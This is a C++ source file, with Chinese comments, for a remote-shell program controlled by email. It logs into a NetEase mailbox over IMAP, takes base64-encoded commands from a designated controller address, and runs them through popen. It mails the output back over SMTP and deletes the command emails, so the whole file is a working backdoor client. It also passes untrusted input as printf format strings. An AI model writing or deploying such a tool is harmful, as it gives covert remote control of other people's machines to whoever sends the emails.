#include "openssl/bio.h"  
#include "openssl/ssl.h"  
#include "openssl/err.h"  
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/un.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <ctime>

SSL_METHOD  *meth;
SSL_CTX     *ctx;
SSL_CTX     *ctx_READ;
SSL         *ssl;
SSL	    *ssl_READ;
int nFd;
int nFd_R;
//char szBuffer[1024];
char R_Buffer[10000];
char W_Buffer[10000];
char y1[100] = {"Content-Transfer-Encoding: base64\n"};
char U_C_name[100] = {"给此程序发指令的邮箱"};
char U_name[100] = {"此程序登陆的邮箱"};
char U_password[100] = {"此程序登陆的邮箱的密码"};//注：网易邮箱的SMTP和IMAP服务要手动开启
char *base64_encode(char *str) ;
char *base64_decode(const char *code);
void EXIT_IF_TRUE (bool x){
        if (x){
            do {
                    fprintf(stderr, "check '%d' is true\n",x);
                    exit(2);
            }while(0);
        }
} 
int fg_char(char *in,char *mb) {
    //char mb[100] = {"Content-Transfer-Encoding:base64"};
    //std::string in_string = in;
    for (int i = 0; i < strlen(in); i++) {
        if (in[i] == mb[0]) {
            for (int ii = 0; ii < strlen(mb); ii++) {
                if (ii >= strlen(mb)-1) { return ii+i+1; }
                if (in[i + ii] != mb[ii]) { break; }
            }
        }
    }
    return 0;
}
struct sockaddr_in Write_remote_addr;
int read_I = 0;
bool ReadEmailInit(){
	memset(R_Buffer,'\0',10000);
        memset(W_Buffer,'\0',10000);
	memset(&Write_remote_addr,0,sizeof(Write_remote_addr)); //清零
	Write_remote_addr.sin_family=AF_INET; //设置为IP通信
	Write_remote_addr.sin_addr.s_addr=inet_addr("220.181.12.100");//服务器IP地址
	Write_remote_addr.sin_port=htons(993); //服务器端口号
	EXIT_IF_TRUE((ctx_READ = SSL_CTX_new (TLS_client_method())) == NULL);
	if((nFd_R=socket(PF_INET,SOCK_STREAM,0))<0)
	{
            perror("socket error");
    	    return 0;
	}
	if(connect(nFd_R,(struct sockaddr *)&Write_remote_addr,sizeof(struct sockaddr))<0)
	{
		perror("connect error");
	        return 0;
	}
	//printf("sock");
	//printf(" OK\n");
	EXIT_IF_TRUE( (ssl_READ = SSL_new (ctx_READ)) == NULL);
	SSL_set_fd (ssl_READ, nFd_R);
	EXIT_IF_TRUE( SSL_connect (ssl_READ) != 1);
	//printf("Init OK\n");
	SSL_read(ssl_READ,R_Buffer,BUFSIZ);
	//printf(R_Buffer);
	sprintf(W_Buffer, "A%d ", read_I);
	SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
	SSL_write(ssl_READ,"LOGIN ",strlen("LOGIN "));
	SSL_write(ssl_READ,U_name,strlen(U_name));
	SSL_write(ssl_READ," ",strlen(" "));
	SSL_write(ssl_READ,U_password,strlen(U_password));
        SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
	read_I++;
	SSL_read(ssl_READ,R_Buffer,BUFSIZ);
	sprintf(W_Buffer, "A%d ", read_I);
	SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
        SSL_write(ssl_READ,"ID (\"name\" \"IMAPClient\" \"version\" \"2.1.0\")",strlen("ID (\"name\" \"IMAPClient\" \"version\" \"2.1.0\")"));
        SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
        read_I++;
        SSL_read(ssl_READ,R_Buffer,BUFSIZ);
	//delete[] R_Buffer;
	//delete[] W_Buffer;
	return 1;
}
int ReadEmail(char *out_Read_Email){
	//printf("OK\n");
	memset(R_Buffer,'\0',10000);
	memset(W_Buffer,'\0',10000);
	//printf("OK\n");
	sprintf(W_Buffer, "A%d ", read_I);
        SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
        SSL_write(ssl_READ,"EXAMINE INBOX",strlen("EXAMINE INBOX"));
        SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
        read_I++;
	memset(R_Buffer,'\0',10000);
        memset(W_Buffer,'\0',10000);
        SSL_read(ssl_READ,R_Buffer,BUFSIZ);
	//printf(R_Buffer);
	//printf("A:%d\n",(R_Buffer[2]!='0'));
	if(R_Buffer[2]!='0'){
		//printf("OK\n");
		sprintf(W_Buffer, "A%d ", read_I);
        	SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
        	SSL_write(ssl_READ,"Fetch 1 rfc822",strlen("Fetch 1 rfc822"));
        	SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
        	read_I++;
		memset(R_Buffer,'\0',10000);
        	memset(W_Buffer,'\0',10000);
        	SSL_read(ssl_READ,R_Buffer,BUFSIZ);
		//printf();
		//printf(R_Buffer);
		//char D_R_Buffer[1000];
		//printf("OK");
		//printf(R_Buffer);
		if(fg_char(R_Buffer,U_C_name)){
			//printf(R_Buffer);
			int begin =  fg_char(R_Buffer, y1)+3;
			//printf("%d\n",begin);
			std::string S_y2(R_Buffer);
			std::string q = S_y2.substr(begin);
			int end = begin+q.find('\n')-1;
			std::string out_s = S_y2.substr(begin,end-begin+1);
			const char *out_C = out_s.c_str();
			//printf(base64_decode(out_C));
			sprintf(W_Buffer, "A%d ", read_I);
                	SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
                	SSL_write(ssl_READ,"SELECT INBOX",strlen("SELECT INBOX"));
                	SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
                	read_I++;
			memset(R_Buffer,'\0',10000);
		        memset(W_Buffer,'\0',10000);
			SSL_read(ssl_READ,R_Buffer,BUFSIZ);
                	sprintf(W_Buffer, "A%d ", read_I);
                	SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
                	SSL_write(ssl_READ,"STORE 1 +FLAGS (\\DELETED)",strlen("STORE 1 +FLAGS (\\DELETED)"));
                	SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
                	read_I++;
			memset(R_Buffer,'\0',10000);
		        memset(W_Buffer,'\0',10000);
			SSL_read(ssl_READ,R_Buffer,BUFSIZ);
                	sprintf(W_Buffer, "A%d ", read_I);
                	SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
                	SSL_write(ssl_READ,"EXPUNGE",strlen("EXPUNGE"));
                	SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
                	read_I++;
			memset(R_Buffer,'\0',10000);
		        memset(W_Buffer,'\0',10000);
			SSL_read(ssl_READ,R_Buffer,BUFSIZ);
			strcpy(out_Read_Email,base64_decode(out_C));
			//delete[] R_Buffer;
        		//delete[] W_Buffer;
			return 1;
		}
		sprintf(W_Buffer, "A%d ", read_I);
                SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
                SSL_write(ssl_READ,"SELECT INBOX",strlen("SELECT INBOX"));
                SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
                read_I++;
		memset(R_Buffer,'\0',10000);
	        memset(W_Buffer,'\0',10000);
		SSL_read(ssl_READ,R_Buffer,BUFSIZ);
                sprintf(W_Buffer, "A%d ", read_I);
                SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
                SSL_write(ssl_READ,"STORE 1 +FLAGS (\\DELETED)",strlen("STORE 1 +FLAGS (\\DELETED)"));
                SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
                read_I++;
		memset(R_Buffer,'\0',10000);
	        memset(W_Buffer,'\0',10000);
		SSL_read(ssl_READ,R_Buffer,BUFSIZ);
                sprintf(W_Buffer, "A%d ", read_I);
                SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
                SSL_write(ssl_READ,"EXPUNGE",strlen("EXPUNGE"));
                SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
                read_I++;
		memset(R_Buffer,'\0',10000);
	        memset(W_Buffer,'\0',10000);
		SSL_read(ssl_READ,R_Buffer,BUFSIZ);
	}
	//delete[] R_Buffer;
        //delete[] W_Buffer;
	return 0;
}
void Read_Email_close(){
	memset(R_Buffer,'\0',10000);
        memset(W_Buffer,'\0',10000);
	sprintf(W_Buffer, "A%d ", read_I);
        SSL_write(ssl_READ,W_Buffer,strlen(W_Buffer));
        SSL_write(ssl_READ,"LOGOUT",strlen("LOGOUT"));
        SSL_write(ssl_READ,"\r\n",strlen("\r\n"));
        read_I = 0;
        SSL_read(ssl_READ,R_Buffer,BUFSIZ);
	SSL_shutdown(ssl_READ);
        SSL_CTX_free(ctx_READ);
        close(nFd_R);
	//delete[] close_R_Buffer;
        //delete[] close_W_Buffer;
}
struct sockaddr_in remote_addr;
bool Init_ssl(){
	SSLeay_add_ssl_algorithms();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ERR_load_BIO_strings();
}
bool SendEmailInit(){
	memset(R_Buffer,'\0',10000);
	//printf("WILL\n");
	memset(&remote_addr,0,sizeof(remote_addr)); //清零
	//printf("OK\n");
	remote_addr.sin_family=AF_INET; //设置为IP通信
	remote_addr.sin_addr.s_addr=inet_addr("220.181.15.161");//服务器IP地址	
	remote_addr.sin_port=htons(465); //服务器端口号
	//printf("OK\n");
	EXIT_IF_TRUE((ctx = SSL_CTX_new (TLS_client_method())) == NULL);
	//printf("OK\n");
	if((nFd=socket(PF_INET,SOCK_STREAM,0))<0)
	{
            perror("socket error");
    	    return 0;
	}
	//printf("OK\n");
	if(connect(nFd,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr))<0)
	{
		perror("connect error");
	        return 0;
	}
	//printf("sock");
	//printf(" OK\n");
	EXIT_IF_TRUE( (ssl = SSL_new (ctx)) == NULL);
	//printf("OK\n");
	SSL_set_fd (ssl, nFd);
	//printf("there\n");
	EXIT_IF_TRUE( SSL_connect (ssl) != 1);
	//printf("WILL\n");
	//char R_Buffer[1000];
	//printf("OK\n");
	SSL_read(ssl,R_Buffer,BUFSIZ);
	//printf(R_Buffer);
	SSL_write(ssl,"helo smtp",strlen("helo smtp"));
        SSL_write(ssl,"\r\n",strlen("\r\n"));
	SSL_read(ssl,R_Buffer,BUFSIZ);
        //printf(R_Buffer);
	SSL_write(ssl,"auth login",strlen("auth login"));
	SSL_write(ssl,"\r\n",strlen("\r\n"));
	SSL_read(ssl,R_Buffer,BUFSIZ);
        //printf(R_Buffer);
	SSL_write(ssl,base64_encode(U_name),strlen(base64_encode(U_name)));
        SSL_write(ssl,"\r\n",strlen("\r\n"));
	SSL_read(ssl,R_Buffer,BUFSIZ);
	//printf(base64_encode(U_name));
	//printf("O\n");
        //printf(R_Buffer);
	SSL_write(ssl,base64_encode(U_password),strlen(base64_encode(U_password)));
        SSL_write(ssl,"\r\n",strlen("\r\n"));
	SSL_read(ssl,R_Buffer,BUFSIZ);
        //printf(base64_encode(U_password));
	//printf("O\n");
        //printf(R_Buffer);
	return 1;
}
void SendEmails(char* data,char* to_Uname){
	//char R_Buffer[20000];
	memset(R_Buffer,'\0',10000);
	SSL_write(ssl,"mail from:<",strlen("mail from:<"));
	SSL_write(ssl,U_name,strlen(U_name));
        SSL_write(ssl,">\r\n",strlen(">\r\n"));
	//Delay(100);
	SSL_write(ssl,"rcpt to:<",strlen("rcpt to:<"));
        SSL_write(ssl,to_Uname,strlen(to_Uname));
        SSL_write(ssl,">\r\n",strlen(">\r\n"));
	//Delay(100);
	SSL_write(ssl,"data",strlen("data"));
	SSL_write(ssl,"\r\n",strlen("\r\n"));
	//Delay(100);
	SSL_write(ssl,"subject:",strlen("subject:"));
	SSL_write(ssl,data,strlen(data));
	SSL_write(ssl,"\r\n.\r\n",strlen("\r\n.\r\n"));
	SSL_read(ssl,R_Buffer,BUFSIZ);
	//delete[] R_Buffer;
	//printf(R_Buffer);
}
bool SendEmailClose(){
	//SSL_write(ssl,"quit\r\n",strlen("quit\r\n"));
	//printf("cmd end3\n");
	SSL_free (ssl);
	SSL_CTX_free (ctx);
	close(nFd);
}  
char *base64_encode(char *str)  
{  
    long len;  
    long str_len;  
    char *res;  
    int i,j;  
//定义base64编码表  
    char base64_table[100]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";  
  
//计算经过base64编码后的字符串长度  
    str_len=strlen(str);  
    if(str_len % 3 == 0)  
        len=str_len/3*4;  
    else  
        len=(str_len/3+1)*4;  
  
    res=(char*)(malloc(sizeof(unsigned char)*len+1));  
    res[len]='\0';  
  
//以3个8位字符为一组进行编码  
    for(i=0,j=0;i<len-2;j+=3,i+=4)  
    {  
        res[i]=base64_table[str[j]>>2]; //取出第一个字符的前6位并找出对应的结果字符  
        res[i+1]=base64_table[(str[j]&0x3)<<4 | (str[j+1]>>4)]; //将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  
        res[i+2]=base64_table[(str[j+1]&0xf)<<2 | (str[j+2]>>6)]; //将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  
        res[i+3]=base64_table[str[j+2]&0x3f]; //取出第三个字符的后6位并找出结果字符  
    }  
  
    switch(str_len % 3)  
    {  
        case 1:  
            res[i-2]='=';  
            res[i-1]='=';  
            break;  
        case 2:  
            res[i-1]='=';  
            break;  
    }  
  
    return res;  
}  
  
 char *base64_decode(const char *code)  
{  
//根据base64表，以字符找到对应的十进制数据  
    int table[]={0,0,0,0,0,0,0,0,0,0,0,0,
    		 0,0,0,0,0,0,0,0,0,0,0,0,
    		 0,0,0,0,0,0,0,0,0,0,0,0,
    		 0,0,0,0,0,0,0,62,0,0,0,
    		 63,52,53,54,55,56,57,58,
    		 59,60,61,0,0,0,0,0,0,0,0,
    		 1,2,3,4,5,6,7,8,9,10,11,12,
    		 13,14,15,16,17,18,19,20,21,
    		 22,23,24,25,0,0,0,0,0,0,26,
    		 27,28,29,30,31,32,33,34,35,
    		 36,37,38,39,40,41,42,43,44,
    		 45,46,47,48,49,50,51
    	       };  
    long len;  
    long str_len;  
    char *res;  
    int i,j;  
  
//计算解码后的字符串长度  
    len=strlen(code);  
//判断编码后的字符串后是否有=  
    if(strstr(code,"=="))  
        str_len=len/4*3-2;  
    else if(strstr(code,"="))  
        str_len=len/4*3-1;  
    else  
        str_len=len/4*3;  
  
    res=(char*)(malloc(sizeof(unsigned char)*str_len+1));  
    res[str_len]='\0';  
  
//以4个字符为一位进行解码  
    for(i=0,j=0;i < len-2;j+=3,i+=4)  
    {  
        res[j]=((unsigned char)table[code[i]])<<2 | (((unsigned char)table[code[i+1]])>>4); //取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  
        res[j+1]=(((unsigned char)table[code[i+1]])<<4) | (((unsigned char)table[code[i+2]])>>2); //取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  
        res[j+2]=(((unsigned char)table[code[i+2]])<<6) | ((unsigned char)table[code[i+3]]); //取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  
    }  
  
    return res;  
  
}  
char shell_in[10003];
char will_send_shell_out[20003];
char out_EMAIL[10000] = {};
//char *shell_out = new char;
int send_and_run_shell(char * in){
	char x[10002] = {0};
	char *out = new char[20003];
	FILE * pipeLine = popen(in,"r");
        while(fgets(x,10000,pipeLine) != NULL){
            if(strlen(out) >= 20000){
                SendEmails(out,U_C_name);
                memset(out,'\0',strlen(out));
            }
            //std::cout << out_EMAIL;
            //SendEmails(will_send_shell_out,U_C_name);
            snprintf(out+strlen(out)*sizeof(char),strlen(x)+1,x);
        }
        //printf("cmd end\n");
        SendEmails(out,U_C_name);
        memset(in,'\0',strlen(in));
        memset(out,'\0',strlen(out));
}
int main(){
	Init_ssl();
	ReadEmailInit();
	SendEmailInit();
	//ReadEmail(shell_in);
	while(1){
		//printf("%d",ReadEmail(shell_in));
		//printf("\n\n");
		if(ReadEmail(shell_in)){
			printf(shell_in);
			printf("\n\n");
			//if(!strcmp(shell_in,"out")){ 
                        //	SendEmails("OK",U_C_name);
                        //	break;
                	//}
		        //const char *cmdStr = shell_in;
			//printf("cmd begin\n");
		        send_and_run_shell(shell_in);
			//printf("cmd end\n");
			Read_Email_close();
                        ReadEmailInit();
			//printf("cmd end1\n");
			SendEmailClose();
			//printf("cmd end2\n");
			SendEmailInit();
			//printf("cmd end\n");
		}
		//if(read_I > 10000){
		Read_Email_close();
		ReadEmailInit();
		//printf("cmd end11\n");
                SendEmailClose();
                //printf("cmd end12\n");
                SendEmailInit();

		//}
		for(int delay_i = 0;delay_i < 229000000;delay_i++);
	}
	
	//SendEmails(shell_in,U_C_name);
	Read_Email_close();
	SendEmailClose();
}
